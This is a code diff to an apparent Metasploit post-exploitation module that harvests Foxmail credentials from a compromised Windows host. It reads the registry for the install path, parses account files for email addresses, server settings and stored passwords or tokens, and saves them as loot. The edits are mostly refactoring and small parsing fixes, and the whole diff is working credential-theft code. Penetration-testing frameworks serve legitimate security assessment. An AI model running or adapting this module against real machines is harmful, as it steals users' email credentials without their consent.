@@ -53,10 +53,10 @@ class MetasploitModule < Msf::Post
   def enum_session_file(fpath)
     account_paths = []
     session.fs.dir.foreach(fpath) do |mail_addr|
-      account_path = fpath + '\\' + mail_addr + '\\Accounts\\Account'
-      account_paths.push(account_path + '.rec0') if session.fs.file.exist?(account_path + '.rec0')
-      account_paths.push(account_path + '.stg') if session.fs.file.exist?(account_path + '.stg')
-      account_paths.push(account_path + '.tdat') if session.fs.file.exist?(account_path + '.tdat')
+      account_path = "#{fpath}\\#{mail_addr}\\Accounts\\Account"
+      account_paths.push("#{account_path}.rec0") if session.fs.file.exist?("#{account_path}.rec0")
+      account_paths.push("#{account_path}.stg") if session.fs.file.exist?("#{account_path}.stg")
+      account_paths.push("#{account_path}.tdat") if session.fs.file.exist?("#{account_path}.tdat")
     end
     tbl = []
     print_status("Search account files on #{fpath}")
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Post
     # enum session file
     account_paths.each do |file_name|
       file = read_file(file_name) if session.fs.file.exist?(file_name)
-      if file.nil? || file.empty?
+      if file.nil? || file.empty? || file[0, 4] != 'RECF'
         next
       end
 
@@ -84,12 +84,12 @@ class MetasploitModule < Msf::Post
         if (file[index] && file[index] > "\x20" && file[index] < "\x7f" && file[index] != "\x3d")
           buffer += file[index]
           case buffer
-            when 'Email', 'IncomingServer', 'OutgoingServer', 'Password'
-              email_info[buffer] = find_string(file, index + offset) || nil
-            when 'IncomingPort', 'OutgoingPort'
-              email_info[buffer] = find_string(file, index + 5, 2) || nil
-            when 'InComingSSL', 'OutgoingSSL'
-              email_info[buffer] = find_string(file, index + 5, 2) == 1 || false
+          when 'Email', 'IncomingServer', 'OutgoingServer', 'Password'
+            email_info[buffer] = find_string(file, index + offset) || nil
+          when 'IncomingPort', 'OutgoingPort'
+            email_info[buffer] = find_string(file, index + 5, 2) || nil
+          when 'InComingSSL', 'OutgoingSSL'
+            email_info[buffer] = find_string(file, index + 5, 2) == 1 || false
           end
         else
           buffer = ''
@@ -162,18 +162,18 @@ class MetasploitModule < Msf::Post
     if datastore['ACCOUNT_PATH'].to_s.empty?
       parent_key = 'HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview'
       root_path = registry_getvaldata(parent_key, 'Executable')
-      foxmail_path = root_path[0, root_path.rindex('\\') + 1] + 'Storage' if !root_path.to_s.empty?
+      foxmail_path = "#{root_path[0, root_path.rindex('\\') + 1]}Storage" if !root_path.to_s.empty?
     else
       foxmail_path = expand_path(datastore['ACCOUNT_PATH'])
     end
-    if !foxmail_path.to_s.empty?
+    if session.fs.dir.exist?(foxmail_path)
       result = enum_session_file(foxmail_path)
       columns = [
         'Email',
         'Server',
         'Port',
         'SSL',
-        'Password'
+        'Password or Token'
       ]
       tbl = Rex::Text::Table.new(
         'Header' => 'Foxmail Password',
@@ -182,10 +182,12 @@ class MetasploitModule < Msf::Post
       result.each do |item|
         tbl << item.values
       end
-      print_line(tbl.to_s)
-      if tbl.rows.count
+      if !tbl.rows.empty?
+        print_line(tbl.to_s)
         path = store_loot('host.foxmail_password', 'text/plain', session, tbl.to_s, 'foxmail_password.txt', 'foxmail Passwords')
         print_good("Passwords stored in: #{path}")
+      else
+        print_status('Nothing was found')
       end
     else
       print_error('Could not find the registry entry for the Foxmail account path. Ensure that Foxmail is installed on the target.')
